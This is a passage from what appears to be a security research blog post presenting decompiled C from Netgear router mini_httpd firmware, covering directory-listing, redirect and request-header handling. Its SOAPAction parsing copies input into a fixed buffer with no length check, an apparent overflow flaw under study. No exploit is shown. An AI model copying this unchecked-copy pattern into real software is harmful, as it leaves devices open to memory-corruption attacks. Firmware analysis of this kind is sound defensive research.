class="string">&quot;&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        stream = scandir64(dword_429734, &amp;v166, <span class="number">0</span>, &amp;alphasort64);</span><br><span class="line">        <span class="keyword">if</span> ( stream &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v169 = <span class="number">0</span>;</span><br><span class="line">          <span class="built_in">snprintf</span>(</span><br><span class="line">            v177,</span><br><span class="line">            <span class="number">0x2710</span>u,</span><br><span class="line">            <span class="string">&quot;&lt;!DOCTYPE html PUBLIC \&quot;-//W3C//DTD HTML 4.01 Transitional//EN\&quot; \&quot;http://www.w3.org/TR/html4/loose.dtd\&quot;&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;&lt;html&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  &lt;head&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;    &lt;meta http-equiv=\&quot;Content-type\&quot; content=\&quot;text/html;charset=UTF-8\&quot;&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;    &lt;title&gt;Index of %s&lt;/title&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  &lt;/head&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  &lt;body bgcolor=\&quot;#99cc99\&quot; text=\&quot;#000000\&quot; link=\&quot;#2020ff\&quot; vlink=\&quot;#4040cc\&quot;&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;    &lt;h4&gt;Index of %s&lt;/h4&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;    &lt;pre&gt;\n&quot;</span>,</span><br><span class="line">            dword_429734,</span><br><span class="line">            dword_429734);</span><br><span class="line">          v156 = <span class="number">0</span>;</span><br><span class="line">          sub_405B4C(&amp;v168, &amp;v169, &amp;v167, v177);</span><br><span class="line">          <span class="keyword">while</span> ( v156 != stream )</span><br><span class="line">          &#123;</span><br><span class="line">            haystack = dword_429734;</span><br><span class="line">            v157 = (*(v166 + <span class="number">4</span> * v156) + <span class="number">19</span>);</span><br><span class="line">            v181 = *(v166 + <span class="number">4</span> * v156);</span><br><span class="line">            <span class="built_in">snprintf</span>(byte_42EBA4, <span class="number">0x7D0</span>u, <span class="string">&quot;%s/%s&quot;</span>, dword_429734, v157);</span><br><span class="line">            <span class="keyword">if</span> ( !is_usb_session || is_readable(haystack, v157) )</span><br><span class="line">            &#123;</span><br><span class="line">              v159 = lstat64(byte_42EBA4, v174);</span><br><span class="line">              v158 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">              <span class="keyword">if</span> ( v159 &gt;= <span class="number">0</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v160 = <span class="built_in">strcmp</span>(v157, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">                v158 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">                <span class="keyword">if</span> ( v160 )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> ( !is_usb_session</span><br><span class="line">                    || (v175 &amp; <span class="number">0xF000</span>) != <span class="number">40960</span></span><br><span class="line">                    || !*(v181 + <span class="number">19</span>)</span><br><span class="line">                    || (v161 = <span class="built_in">strstr</span>(haystack, <span class="string">&quot;shares/USB_Storage&quot;</span>), v158 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>), !v161)</span><br><span class="line">                    &amp;&amp; (!<span class="built_in">strstr</span>(haystack, <span class="string">&quot;shares/&quot;</span>)</span><br><span class="line">                     || (v162 = <span class="built_in">strstr</span>(haystack, <span class="string">&quot;_Drive&quot;</span>), v158 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>), !v162)) )</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v157, <span class="string">&quot;..&quot;</span>) )</span><br><span class="line">                    &#123;</span><br><span class="line">                      v163 = <span class="built_in">strcmp</span>(dword_429734, <span class="string">&quot;shares/&quot;</span>);</span><br><span class="line">                      v158 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">                      <span class="keyword">if</span> ( v163 )</span><br><span class="line">                      &#123;</span><br><span class="line">                        sub_406E78(v157);</span><br><span class="line">                        <span class="built_in">snprintf</span>(byte_42EBA4, <span class="number">0x7D0</span>u, <span class="string">&quot;&lt;A HREF=\&quot;%s\&quot;&gt;[To Parent Directory]&lt;/A&gt;\n&quot;</span>, byte_42F374);</span><br><span class="line">                        v158 = byte_42EBA4;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      v164 = localtime(&amp;dword_432B70);</span><br><span class="line">                      strftime(v172, <span class="number">0x3C</span>u, <span class="string">&quot;%A, %B %d, %Y  %l:%M %p&quot;</span>, v164);</span><br><span class="line">                      sub_406E78(v157);</span><br><span class="line">                      <span class="built_in">snprintf</span>(</span><br><span class="line">                        byte_42EBA4,</span><br><span class="line">                        <span class="number">0x7D0</span>u,</span><br><span class="line">                        <span class="string">&quot;%-40s %14lld     &lt;A HREF=\&quot;%s\&quot;&gt;%s&lt;/A&gt;\n&quot;</span>,</span><br><span class="line">                        v172,</span><br><span class="line">                        v176,</span><br><span class="line">                        byte_42F374,</span><br><span class="line">                        v157);</span><br><span class="line">                      v158 = byte_42EBA4;</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">memset</span>(byte_42EBA4, <span class="number">0</span>, <span class="keyword">sizeof</span>(byte_42EBA4));</span><br><span class="line">              v158 = byte_42EBA4;</span><br><span class="line">            &#125;</span><br><span class="line">            sub_405B4C(&amp;v168, &amp;v169, &amp;v167, v158);</span><br><span class="line">            v156 = (v156 + <span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">snprintf</span>(</span><br><span class="line">            v177,</span><br><span class="line">            <span class="number">0x2710</span>u,</span><br><span class="line">            <span class="string">&quot;    &lt;/pre&gt;\n\n    &lt;hr&gt;\n\n    &lt;address&gt;&lt;a href=\&quot;%s\&quot;&gt;%s&lt;/a&gt;&lt;/address&gt;\n  \n  &lt;/body&gt;\n\n&lt;/html&gt;\n&quot;</span>,</span><br><span class="line">            <span class="string">&quot;http://www.acme.com/software/mini_httpd/&quot;</span>,</span><br><span class="line">            <span class="string">&quot;mini_httpd/1.24 10May2016&quot;</span>);</span><br><span class="line">          sub_405B4C(&amp;v168, &amp;v169, &amp;v167, v177);</span><br><span class="line">          sub_4070A4(<span class="number">200</span>, <span class="string">&quot;Ok&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;text/html; charset=%s&quot;</span>, optlen_4);</span><br><span class="line">          <span class="keyword">if</span> ( dword_429730 != <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            *(v168 + v167) = <span class="number">0</span>;</span><br><span class="line">            sub_405BB0(v168);</span><br><span class="line">          &#125;</span><br><span class="line">          sub_406B58();</span><br><span class="line">          <span class="keyword">return</span> (SSL_free)(dword_429770);</span><br><span class="line">        &#125;</span><br><span class="line">        v155 = ntoa(&amp;client_addr);</span><br><span class="line">        syslog(<span class="number">6</span>, <span class="string">&quot;%.80s Directory \&quot;%.80s\&quot; is protected&quot;</span>, v155, path);</span><br><span class="line">        v20 = <span class="number">403</span>;</span><br><span class="line">        v21 = <span class="string">&quot;Forbidden&quot;</span>;</span><br><span class="line">        v22 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v20 = <span class="number">403</span>;</span><br><span class="line">        v21 = <span class="string">&quot;Forbidden&quot;</span>;</span><br><span class="line">        v22 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v23 = <span class="string">&quot;Directory is protected.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *dword_42973C )</span><br><span class="line">        <span class="built_in">snprintf</span>(v177, <span class="number">0x2710</span>u, <span class="string">&quot;Location: %s/?%s&quot;</span>, path, dword_42973C);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">snprintf</span>(v177, <span class="number">0x2710</span>u, <span class="string">&quot;Location: %s/&quot;</span>, path);</span><br><span class="line">      v20 = <span class="number">302</span>;</span><br><span class="line">      v21 = <span class="string">&quot;Found&quot;</span>;</span><br><span class="line">      v22 = v177;</span><br><span class="line">      v23 = <span class="string">&quot;Directories must end with a slash.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_382:</span><br><span class="line">    send_error(v20, v21, v22, v23);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( m = v144 - <span class="number">1</span>; *m == <span class="number">47</span>; --m )</span><br><span class="line">    *m = <span class="number">0</span>;</span><br><span class="line">LABEL_361:</span><br><span class="line">  execute_cgi();</span><br><span class="line">  <span class="keyword">return</span> (SSL_free)(dword_429770);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.2.0.76</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">handle_request</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 省略变量定义部分</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(v224, off_42A080, <span class="keyword">sizeof</span>(v224));</span><br><span class="line">  signal(<span class="number">14</span>, sub_408800);</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  dword_42C878 = <span class="number">0</span>;</span><br><span class="line">  dword_42C89C = <span class="number">-1</span>;</span><br><span class="line">  dword_42C87C = <span class="number">0</span>;</span><br><span class="line">  path = <span class="number">0</span>;</span><br><span class="line">  host = <span class="number">0</span>;</span><br><span class="line">  dword_42C880 = <span class="number">0</span>;</span><br><span class="line">  dword_42C8B4 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  dword_42C884 = <span class="number">0</span>;</span><br><span class="line">  dword_42C8B8 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  dword_42C8BC = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  dword_42C888 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  dword_42C890 = <span class="number">0</span>;</span><br><span class="line">  dword_42C898 = <span class="number">-1</span>;</span><br><span class="line">  dword_42C8A0 = <span class="number">0</span>;</span><br><span class="line">  authorization = <span class="number">0</span>;</span><br><span class="line">  dword_42C8A8 = <span class="number">-1</span>;</span><br><span class="line">  dword_42C8B0 = <span class="number">-1</span>;</span><br><span class="line">  dword_42C88C = <span class="number">0</span>;</span><br><span class="line">  dword_42C8A4 = <span class="number">0</span>;</span><br><span class="line">  dword_42C8AC = <span class="number">0</span>;</span><br><span class="line">  dword_42A248 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !do_ssl )</span><br><span class="line">  &#123;</span><br><span class="line">    v223 = <span class="number">1</span>;</span><br><span class="line">    setsockopt(dword_42C86C, <span class="number">6</span>, <span class="number">3</span>, &amp;v223, <span class="number">4u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( do_ssl )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_42C8C0 = SSL_new(dword_42B864);</span><br><span class="line">    SSL_set_fd(dword_42C8C0, dword_42C86C);</span><br><span class="line">    v0 = SSL_accept(dword_42C8C0);</span><br><span class="line">    v1 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v0 )</span><br><span class="line">LABEL_106:</span><br><span class="line">      <span class="built_in">exit</span>(v1);</span><br><span class="line">  &#125;</span><br><span class="line">  dword_42C8C4 = <span class="number">0</span>;</span><br><span class="line">  dword_42C8C8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = sub_407960(v230, <span class="number">9999</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/dbg_x&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = fopen64(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">fprintf</span>(v3, <span class="string">&quot;[%s::%s():%d] &quot;</span>, <span class="string">&quot;mini_httpd.c&quot;</span>, <span class="string">&quot;handle_request&quot;</span>, <span class="number">1648</span>);</span><br><span class="line">          <span class="built_in">fputs</span>(<span class="string">&quot;read\n&quot;</span>, v3);</span><br><span class="line">          fclose(v3);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v4 = *_errno_location();</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">4</span> &amp;&amp; v4 != <span class="number">11</span> )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_14:</span><br><span class="line">        <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/dbg_x&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = fopen64(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v6 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(v6, <span class="string">&quot;[%s::%s():%d] &quot;</span>, <span class="string">&quot;mini_httpd.c&quot;</span>, <span class="string">&quot;handle_request&quot;</span>, <span class="number">1653</span>);</span><br><span class="line">            v7 = <span class="string">&quot;break on nothing read\n&quot;</span>;</span><br><span class="line">LABEL_25:</span><br><span class="line">            <span class="built_in">fputs</span>(v7, v6);</span><br><span class="line">            fclose(v6);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    alarm(<span class="number">0x3C</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/dbg_x&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = fopen64(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v8 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(v8, <span class="string">&quot;[%s::%s():%d] &quot;</span>, <span class="string">&quot;mini_httpd.c&quot;</span>, <span class="string">&quot;handle_request&quot;</span>, <span class="number">1657</span>);</span><br><span class="line">        <span class="built_in">fprintf</span>(v8, <span class="string">&quot;read: %s\n&quot;</span>, v230);</span><br><span class="line">        fclose(v8);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_406164(&amp;dword_42C8CC, &amp;dword_42C8C4, &amp;dword_42C8D0, v230, v2);</span><br><span class="line">    v9 = dword_42C8CC;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( !<span class="built_in">strstr</span>(dword_42C8CC, <span class="string">&quot;\r\n\r\n&quot;</span>) &amp;&amp; !<span class="built_in">strstr</span>(v9, <span class="string">&quot;\n\n&quot;</span>) );</span><br><span class="line">  <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/dbg_x&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = fopen64(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(v6, <span class="string">&quot;[%s::%s():%d] &quot;</span>, <span class="string">&quot;mini_httpd.c&quot;</span>, <span class="string">&quot;handle_request&quot;</span>, <span class="number">1663</span>);</span><br><span class="line">      v7 = <span class="string">&quot;break on find 2 crlf\n&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_26:</span><br><span class="line">  v10 = sub_405E10(v5);</span><br><span class="line">  v11 = v10;</span><br><span class="line">  <span class="keyword">if</span> ( !v10 || (v12 = <span class="built_in">strpbrk</span>(v10, <span class="string">&quot; \t\n\r&quot;</span>), (path = v12) == <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_45:</span><br><span class="line">    v17 = <span class="number">400</span>;</span><br><span class="line">    v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    v18 = <span class="string">&quot;Bad Request&quot;</span>;</span><br><span class="line">LABEL_438:</span><br><span class="line">    v20 = <span class="string">&quot;Can&#x27;t parse request.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">  &#125;</span><br><span class="line">  *v12 = <span class="number">0</span>;</span><br><span class="line">  path = (v12 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v12 + <span class="number">1</span>, <span class="string">&quot;ptimeout.cgi&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !dword_42C870 )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = getppid();</span><br><span class="line">      kill(v14, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v15 = path;</span><br><span class="line">    path = v15 + <span class="built_in">strspn</span>(path, <span class="string">&quot; \t\n\r&quot;</span>);</span><br><span class="line">    v16 = <span class="built_in">strpbrk</span>(path, <span class="string">&quot; \t\n\r&quot;</span>);</span><br><span class="line">    dword_42C88C = v16;</span><br><span class="line">    <span class="keyword">if</span> ( v16 )</span><br><span class="line">    &#123;</span><br><span class="line">      *v16 = <span class="number">0</span>;</span><br><span class="line">      dword_42C88C = (v16 + <span class="number">1</span>);</span><br><span class="line">      v17 = <span class="number">401</span>;</span><br><span class="line">      v18 = <span class="string">&quot;Unauthorized&quot;</span>;</span><br><span class="line">      v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      v20 = <span class="string">&quot;Authorization required.&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v35 = sub_405E10(v13);</span><br><span class="line">    <span class="keyword">if</span> ( !v35 || !*v35 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !strncasecmp(v35, <span class="string">&quot;Authorization:&quot;</span>, <span class="number">0xE</span>u) )</span><br><span class="line">    &#123;</span><br><span class="line">      authorization = &amp;v35[<span class="built_in">strspn</span>(v35 + <span class="number">14</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">14</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v35, <span class="string">&quot;Content-Length:&quot;</span>, <span class="number">0xF</span>u) )</span><br><span class="line">    &#123;</span><br><span class="line">      v21 = v35 + <span class="number">15</span>;</span><br><span class="line">      v22 = <span class="built_in">strspn</span>(v21, <span class="string">&quot; \t&quot;</span>);</span><br><span class="line">      dword_42C8A8 = atol(&amp;v21[v22]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v35, <span class="string">&quot;Content-Type:&quot;</span>, <span class="number">0xD</span>u) )</span><br><span class="line">    &#123;</span><br><span class="line">      dword_42C8A4 = &amp;v35[<span class="built_in">strspn</span>(v35 + <span class="number">13</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">13</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v35, <span class="string">&quot;Cookie:&quot;</span>, <span class="number">7u</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      dword_42C8AC = &amp;v35[<span class="built_in">strspn</span>(v35 + <span class="number">7</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">7</span>];</span><br><span class="line">      dword_42C8D4 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v35, <span class="string">&quot;Host:&quot;</span>, <span class="number">5u</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v23 = &amp;v35[<span class="built_in">strspn</span>(v35 + <span class="number">5</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">5</span>];</span><br><span class="line">      host = v23;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strchr</span>(v23, <span class="number">47</span>) || *v23 == <span class="number">46</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v35, <span class="string">&quot;If-Modified-Since:&quot;</span>, <span class="number">0x12</span>u) )</span><br><span class="line">    &#123;</span><br><span class="line">      v24 = v35 + <span class="number">18</span>;</span><br><span class="line">      v25 = <span class="built_in">strspn</span>(v24, <span class="string">&quot; \t&quot;</span>);</span><br><span class="line">      dword_42C8B0 = tdate_parse(&amp;v24[v25]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !strncasecmp(v35, <span class="string">&quot;Referer:&quot;</span>, <span class="number">8u</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v26 = v35 + <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_52;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !strncasecmp(v35, <span class="string">&quot;Referrer:&quot;</span>, <span class="number">9u</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v26 = v35 + <span class="number">9</span>;</span><br><span class="line">LABEL_52:</span><br><span class="line">        dword_42C8B4 = &amp;v26[<span class="built_in">strspn</span>(v26, <span class="string">&quot; \t&quot;</span>)];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v35, <span class="string">&quot;User-Agent:&quot;</span>, <span class="number">0xB</span>u) )</span><br><span class="line">      &#123;</span><br><span class="line">        dword_42C8B8 = &amp;v35[<span class="built_in">strspn</span>(v35 + <span class="number">11</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">11</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v27 = strncasecmp(v35, <span class="string">&quot;Accept-Language:&quot;</span>, <span class="number">0x10</span>u);</span><br><span class="line">        v28 = v35;</span><br><span class="line">        <span class="keyword">if</span> ( v27 )</span><br><span class="line">        &#123;</span><br><span class="line">          v29 = v35 + <span class="number">11</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !strncasecmp(v28, <span class="string">&quot;SOAPAction:&quot;</span>, <span class="number">0xB</span>u) )</span><br><span class="line">          &#123;</span><br><span class="line">            v30 = <span class="built_in">strspn</span>(v29, <span class="string">&quot; \t&quot;</span>);</span><br><span class="line">            v31 = strcasestr(&amp;v29[v30], <span class="string">&quot;urn:NETGEAR-ROUTER:service:&quot;</span>);</span><br><span class="line">            v13 = (v31 + <span class="number">27</span>);</span><br><span class="line">            <span class="keyword">if</span> ( v31 )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">              &#123;</span><br><span class="line">                v33 = *v13;</span><br><span class="line">                <span class="keyword">if</span> ( v33 == <span class="number">58</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                byte_42C8D8[i] = v33;</span><br><span class="line">                ++v13;</span><br><span class="line">              &#125;</span><br><span class="line">              v34 = <span class="built_in">strchr</span>(v13, <span class="number">35</span>);</span><br><span class="line">              <span class="keyword">if</span> ( v34 &amp;&amp; v34[<span class="number">1</span>] )</span><br><span class="line">                <span class="built_in">snprintf</span>(&amp;byte_42C958, <span class="number">0x80</span>u, <span class="string">&quot;%s&quot;</span>, v34 + <span class="number">1</span>);</span><br><span class="line">              byte_42C8D8[i] = <span class="number">0</span>;</span><br><span class="line">              dword_42C9D8 = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          dword_42C8BC = &amp;v35[<span class="built_in">strspn</span>(v35 + <span class="number">16</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">16</span>];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v36 = nvram_get(<span class="string">&quot;fw_local_force_https&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v36 )</span><br><span class="line">    v36 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *v36 == <span class="string">&#x27;1&#x27;</span> &amp;&amp; !do_ssl &amp;&amp; !path_exist_in_exception_list(path, off_42AEA0, v11) )<span class="comment">// 添加了 HTTPS 支持</span></span><br><span class="line">  &#123;</span><br><span class="line">    LOBYTE(v230[<span class="number">0</span>].sa_family) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;v230[<span class="number">0</span>].sa_family + <span class="number">1</span>, <span class="number">0</span>, <span class="number">0x7F</span>u);</span><br><span class="line">    strlcpy(v230, path, <span class="number">128</span>);</span><br><span class="line">    v37 = v230 + <span class="built_in">strspn</span>(v230, <span class="string">&quot; \t\n\r&quot;</span>);</span><br><span class="line">    *<span class="built_in">strpbrk</span>(v37, <span class="string">&quot; \t\n\r&quot;</span>) = <span class="number">0</span>;</span><br><span class="line">    v38 = dword_42C88C;</span><br><span class="line">    <span class="keyword">if</span> ( !dword_42C88C )</span><br><span class="line">      v38 = <span class="string">&quot;HTTP/1.1&quot;</span>;</span><br><span class="line">    dword_42C88C = v38;</span><br><span class="line">    <span class="built_in">snprintf</span>(&amp;v225, <span class="number">0x9C</span>u, <span class="string">&quot;Location: https://%s%s&quot;</span>, host, v37);</span><br><span class="line">    v17 = <span class="number">302</span>;</span><br><span class="line">    v19 = &amp;v225;</span><br><span class="line">    v20 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    v18 = <span class="string">&quot;Found&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( host )</span><br><span class="line">  &#123;</span><br><span class="line">    v39 = nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v39 )</span><br><span class="line">      v39 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v39 == <span class="number">98</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_581;</span><br><span class="line">    v40 = nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v40 )</span><br><span class="line">      v40 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v40 == <span class="number">99</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_581:</span><br><span class="line">      <span class="keyword">if</span> ( is_captive_detecting(host, dword_42C8B8) )</span><br><span class="line">      &#123;</span><br><span class="line">        dword_42C9DC = <span class="number">1</span>;</span><br><span class="line">        dword_42C88C = <span class="built_in">strpbrk</span>(path, <span class="string">&quot; \t\n\r&quot;</span>);</span><br><span class="line">        v17 = <span class="number">200</span>;</span><br><span class="line">        v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        v18 = <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">        v20 = <span class="string">&quot;Success&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !host &amp;&amp; dword_42C9D8 == <span class="number">1</span> )</span><br><span class="line">    host = <span class="string">&quot;www.routerlogin.com&quot;</span>;</span><br><span class="line">  is_usb_session = usb_session_check();</span><br><span class="line">  v41 = host;</span><br><span class="line">  